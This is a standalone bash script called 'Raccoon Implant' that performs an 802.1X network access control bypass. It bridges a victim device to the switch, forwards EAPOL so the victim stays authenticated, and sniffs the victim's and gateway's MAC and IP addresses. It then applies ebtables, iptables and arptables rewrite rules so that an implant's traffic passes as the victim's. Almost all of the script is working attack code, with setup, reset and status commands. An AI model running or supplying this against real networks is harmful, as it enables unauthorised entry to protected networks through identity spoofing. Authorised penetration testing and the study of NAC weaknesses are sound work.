#!/bin/bash
# Raccoon Implant — 802.1X NAC bypass (standalone)
#
# Usage:
#   sudo ./nac_bypass.sh setup    — full automated bypass
#   sudo ./nac_bypass.sh reset    — tear down and restore
#   sudo ./nac_bypass.sh status   — show current state
#
# Technique:
#   [Switch] ←eth0— [Raccoon] —eth1→ [Victim Device]
#   1. Bridge forwards EAPOL so victim stays authenticated
#   2. Sniff to learn victim MAC/IP + gateway MAC/IP
#   3. ebtables/iptables rewrite so implant shares victim's identity
#
# Based on: scipag/nac_bypass, p292/NACKered
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

UPSTREAM="${UPSTREAM_IFACE:-eth0}"
DOWNSTREAM="${DOWNSTREAM_IFACE:-eth1}"
BRIDGE="${BRIDGE_NAME:-br0}"
STATEFILE="/tmp/.raccoon_nac_state"
DISCOVERY_TIMEOUT="${DISCOVERY_TIMEOUT:-60}"

log() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err() { echo -e "${RED}[-]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }

check_root() {
    if [ "$EUID" -ne 0 ]; then
        err "Must run as root"
        exit 1
    fi
}

check_deps() {
    local missing=()
    for cmd in brctl ebtables iptables arptables tcpdump ip macchanger; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        err "Missing tools: ${missing[*]}"
        err "Install: apt install bridge-utils ebtables iptables arptables tcpdump iproute2 macchanger"
        exit 1
    fi
}

check_interfaces() {
    for iface in "$UPSTREAM" "$DOWNSTREAM"; do
        if ! ip link show "$iface" &>/dev/null; then
            err "Interface $iface not found"
            ip -brief link show | grep -v lo
            exit 1
        fi
    done
}

save_state() {
    cat > "$STATEFILE" <<EOF
ORIG_MAC_UPSTREAM=$(cat /sys/class/net/${UPSTREAM}/address 2>/dev/null || echo "unknown")
ORIG_MAC_BRIDGE=$(cat /sys/class/net/${BRIDGE}/address 2>/dev/null || echo "unknown")
VICTIM_MAC=${VICTIM_MAC:-}
VICTIM_IP=${VICTIM_IP:-}
GATEWAY_MAC=${GATEWAY_MAC:-}
GATEWAY_IP=${GATEWAY_IP:-}
IMPLANT_MAC=${IMPLANT_MAC:-}
EOF
    log "State saved to $STATEFILE"
}

load_state() {
    if [ -f "$STATEFILE" ]; then
        source "$STATEFILE"
    fi
}

# ── Phase 1: EAPOL forwarding ──

setup_eapol() {
    info "Phase 1 — enabling EAPOL forwarding"

    modprobe br_netfilter 2>/dev/null || true

    # Allow 802.1X group address through the bridge
    if [ -f "/sys/class/net/${BRIDGE}/bridge/group_fwd_mask" ]; then
        echo 8 > "/sys/class/net/${BRIDGE}/bridge/group_fwd_mask"
    else
        ip link set "$BRIDGE" type bridge group_fwd_mask 8 2>/dev/null || true
    fi

    ebtables -t filter -D FORWARD -d 01:80:c2:00:00:03 -j DROP 2>/dev/null || true
    ebtables -t filter -A FORWARD -d 01:80:c2:00:00:03 -j ACCEPT 2>/dev/null || true

    log "EAPOL forwarding enabled"
}

# ── Phase 2: discovery ──

discover_victim_mac() {
    info "Phase 2 — sniffing for victim MAC on $DOWNSTREAM"
    VICTIM_MAC=""

    local output
    output=$(timeout "$DISCOVERY_TIMEOUT" tcpdump -i "$DOWNSTREAM" -c 1 -e -nn -q 2>&1) || true

    while IFS= read -r mac; do
        mac_lower=$(echo "$mac" | tr '[:upper:]' '[:lower:]')
        if [ "$mac_lower" != "ff:ff:ff:ff:ff:ff" ] && [ "$mac_lower" != "$IMPLANT_MAC" ]; then
            VICTIM_MAC="$mac_lower"
            break
        fi
    done < <(echo "$output" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')

    if [ -z "$VICTIM_MAC" ]; then
        err "Could not discover victim MAC"
        return 1
    fi
    log "Victim MAC: $VICTIM_MAC"
}

discover_arp() {
    info "Sniffing ARP for IP addresses..."

    local output
    output=$(timeout "$DISCOVERY_TIMEOUT" tcpdump -i "$BRIDGE" -c 30 -e -nn arp 2>&1) || true

    VICTIM_IP=""
    GATEWAY_MAC=""
    GATEWAY_IP=""

    while IFS= read -r line; do
        local src_mac dst_mac
        src_mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1 | tr '[:upper:]' '[:lower:]')

        if [ "$src_mac" = "$VICTIM_MAC" ]; then
            local ip
            ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | tail -1)
            [ -n "$ip" ] && VICTIM_IP="$ip"
        elif [ "$src_mac" != "ff:ff:ff:ff:ff:ff" ] && [ -n "$src_mac" ] && [ "$src_mac" != "$IMPLANT_MAC" ]; then
            GATEWAY_MAC="$src_mac"
            local ip
            ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)
            [ -n "$ip" ] && GATEWAY_IP="$ip"
        fi
    done <<< "$output"

    [ -n "$VICTIM_IP" ] && log "Victim IP: $VICTIM_IP" || warn "Victim IP not found"
    [ -n "$GATEWAY_MAC" ] && log "Gateway MAC: $GATEWAY_MAC" || warn "Gateway MAC not found"
    [ -n "$GATEWAY_IP" ] && log "Gateway IP: $GATEWAY_IP" || warn "Gateway IP not found"
}

# ── Phase 3: rewrite rules ──

apply_rules() {
    info "Phase 3 — applying MAC/IP rewrite rules"

    # Spoof bridge MAC
    ip link set "$BRIDGE" down
    ip link set dev "$BRIDGE" address "$VICTIM_MAC"
    ip link set "$BRIDGE" up
    log "Bridge MAC spoofed to $VICTIM_MAC"

    # ebtables: L2 rewriting
    ebtables -t nat -F

    # Outgoing: implant's real MAC → victim MAC
    ebtables -t nat -A POSTROUTING -s "$IMPLANT_MAC" \
        -o "$UPSTREAM" -j snat --to-source "$VICTIM_MAC"

    # Incoming: if gateway sends to victim MAC, rewrite dst to implant MAC
    if [ -n "$GATEWAY_MAC" ]; then
        ebtables -t nat -A PREROUTING -i "$UPSTREAM" \
            -s "$GATEWAY_MAC" -d "$VICTIM_MAC" \
            -j dnat --to-destination "$IMPLANT_MAC"
    fi

    log "ebtables L2 rules applied"

    # iptables: L3 NAT
    if [ -n "$VICTIM_IP" ]; then
        iptables -t nat -A POSTROUTING -o "$BRIDGE" \
            -j SNAT --to-source "$VICTIM_IP"
        log "iptables SNAT → $VICTIM_IP"
    fi

    # arptables: ARP source rewriting
    arptables -F 2>/dev/null || true
    if [ -n "$VICTIM_MAC" ]; then
        arptables -A OUTPUT -o "$BRIDGE" \
            --opcode request -j mangle --mangle-mac-s "$VICTIM_MAC" 2>/dev/null || true
        arptables -A OUTPUT -o "$BRIDGE" \
            --opcode reply -j mangle --mangle-mac-s "$VICTIM_MAC" 2>/dev/null || true
        log "arptables ARP rewrite applied"
    fi

    # Configure IP on bridge
    if [ -n "$VICTIM_IP" ] && [ -n "$GATEWAY_IP" ]; then
        ip addr flush dev "$BRIDGE"
        ip addr add "${VICTIM_IP}/24" dev "$BRIDGE"
        ip route add default via "$GATEWAY_IP" dev "$BRIDGE" 2>/dev/null || true
        log "Static IP $VICTIM_IP/24 gw $GATEWAY_IP"
    else
        info "Running DHCP on $BRIDGE"
        dhclient -nw "$BRIDGE" 2>/dev/null || true
    fi

    echo ""
    log "NAC bypass ACTIVE"
    log "  Victim:  $VICTIM_MAC / ${VICTIM_IP:-unknown}"
    log "  Gateway: ${GATEWAY_MAC:-unknown} / ${GATEWAY_IP:-unknown}"
    log "  Implant originating traffic as victim's identity"
}

# ── Reset ──

do_reset() {
    info "Resetting NAC bypass rules"
    load_state

    ebtables -t nat -F 2>/dev/null || true
    ebtables -t filter -F 2>/dev/null || true
    iptables -t nat -F 2>/dev/null || true
    arptables -F 2>/dev/null || true

    if [ -n "${ORIG_MAC_BRIDGE:-}" ] && [ "$ORIG_MAC_BRIDGE" != "unknown" ]; then
        ip link set "$BRIDGE" down 2>/dev/null || true
        ip link set dev "$BRIDGE" address "$ORIG_MAC_BRIDGE" 2>/dev/null || true
        ip link set "$BRIDGE" up 2>/dev/null || true
        log "Restored bridge MAC to $ORIG_MAC_BRIDGE"
    fi

    rm -f "$STATEFILE"
    log "NAC bypass rules cleared"
}

# ── Status ──

do_status() {
    echo ""
    info "NAC Bypass Status"
    echo "  ───────────────────────────────────"
    echo "  Upstream:   $UPSTREAM"
    echo "  Downstream: $DOWNSTREAM"
    echo "  Bridge:     $BRIDGE"

    if [ -f "$STATEFILE" ]; then
        load_state
        echo ""
        echo "  Victim MAC:  ${VICTIM_MAC:-not discovered}"
        echo "  Victim IP:   ${VICTIM_IP:-not discovered}"
        echo "  Gateway MAC: ${GATEWAY_MAC:-not discovered}"
        echo "  Gateway IP:  ${GATEWAY_IP:-not discovered}"
        echo "  Implant MAC: ${IMPLANT_MAC:-unknown}"
    else
        echo ""
        echo "  State: not active"
    fi

    echo ""
    echo "  ebtables nat rules:"
    ebtables -t nat -L 2>/dev/null | sed 's/^/    /' || echo "    (none)"
    echo ""
}

# ── Main ──

do_setup() {
    check_root
    check_deps
    check_interfaces

    IMPLANT_MAC=$(cat "/sys/class/net/${UPSTREAM}/address" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    log "Implant MAC: $IMPLANT_MAC"

    save_state
    setup_eapol

    info "Waiting 10s for EAPOL auth to settle..."
    sleep 10

    discover_victim_mac || exit 1
    discover_arp
    save_state

    apply_rules
}

case "${1:-}" in
    setup)   do_setup ;;
    reset)   check_root; do_reset ;;
    status)  do_status ;;
    *)
        echo "Usage: $0 {setup|reset|status}"
        echo ""
        echo "  setup   — run full NAC bypass (EAPOL → discover → rewrite)"
        echo "  reset   — remove all rules, restore original MAC"
        echo "  status  — show current bypass state"
        echo ""
        echo "Environment variables:"
        echo "  UPSTREAM_IFACE     upstream interface (default: eth0)"
        echo "  DOWNSTREAM_IFACE  downstream interface (default: eth1)"
        echo "  BRIDGE_NAME       bridge name (default: br0)"
        echo "  DISCOVERY_TIMEOUT sniff timeout in seconds (default: 60)"
        exit 1
        ;;
esac
